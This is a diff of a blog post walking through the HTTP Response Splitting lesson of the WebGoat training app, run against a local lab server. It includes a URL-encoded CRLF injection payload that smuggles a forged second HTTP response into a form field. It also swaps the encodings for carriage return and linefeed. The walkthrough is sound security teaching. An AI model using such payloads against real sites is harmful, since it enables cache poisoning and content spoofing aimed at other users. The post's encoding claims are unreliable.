@@ -5,7 +5,7 @@ date:   2017-01-24 00:50:00 -0500
 categories: coding security owasp bwa
 ---
 # WebGoat Part 1: HTTP Response Splitting
-The first section of WebGoat is called "General", but the main topic covered is HTTP Response Splitting. HTTP Response splitting is an attack that can be performed on a webserver that does not properly implement sanitization of user input on webpage forms. The specific exploitation that can be performed involves the use of carriage returns (%0a in HTML) and linefeed (%0d in HTML). 
+The first section of WebGoat is called "General", but the main topic covered is HTTP Response Splitting. HTTP Response splitting is an attack that can be performed on a webserver that does not properly implement sanitization of user input on webpage forms. The specific exploitation that can be performed involves the use of carriage returns (%0a in HTML) and linefeeds (%0d in HTML). 
 
 Normally, form entry is passed in a webpage's (client control) request to the webserver. The form fields are then appended onto the request header like so:
 
@@ -15,6 +15,7 @@ GET http://website.com/form_page?form1=field1&form2=field2 HTTP/1.1
 ```
 
 So, we can control part of the request with header data that we enter into our forms. This might not seem immediately malicious, but let's take a look at the WebGoat example:
+
 ```
 POST /WebGoat/lessons/General/redirect.jsp?Screen=3&menu=100 HTTP/1.1
 Host: 192.168.56.101
@@ -31,7 +32,9 @@ Content-Length: 30
 
 language=test&SUBMIT=Search%21
 ```
+
 So in our form we simply entered "test". The POST request URL looks like we are going to be redirected to another resource on the webserver. Let's look at the server response and see what the next step is going to be:
+
 ```
 HTTP/1.1 302 Moved Temporarily
 Date: Tue, 24 Jan 2017 02:35:59 GMT
@@ -43,7 +46,9 @@ Via: 1.1 127.0.1.1
 Vary: Accept-Encoding
 Connection: close
 ```
+
 Alright, so we are being redirected to the location specified by the 'Location' header in the response. Or more clearly:
+
 ```
 Location: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=test
 ```
@@ -53,11 +58,13 @@ Aha! One thing should pop out at us here, and that is the fact that our form inp
 The webcache sits between the user and the webapplication, parsing responses from the webapplication to hand back to users. The exploit that we are abusing lies in tricking the webcache to hand back two responses from a single request. If we are allowed to insert carriage return (%0a) and linefeed (%0d) characters into our request, when the webcache handles the redirect response we can trick it into thinking that there should be two responses by truncating the original response and adding another completely attacker-controlled response to the webcache.
 
 An example form exploit input could be like so (%20 is a URL-encoded space):
+
 ```
 test%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK%0aContent-Type:%20text/html%0aContent-Length:%2017%0a<html>pwnd</html>
 ```
 
 The first section truncates the original intended response by specifying a false Content-Length header. URL-decoded, the redirect response now looks like so:
+
 ```
 HTTP/1.1 302 Moved Temporarily
 Date: Tue, 24 Jan 2017 02:35:59 GMT
@@ -67,6 +74,7 @@ Content-Length: 0
 ```
 
 The response is considered complete at this point. However, we have appended some extra data, that URL-decoded looks like so:
+
 ```
 HTTP/1.1 200 OK
 Content-Type:text/html
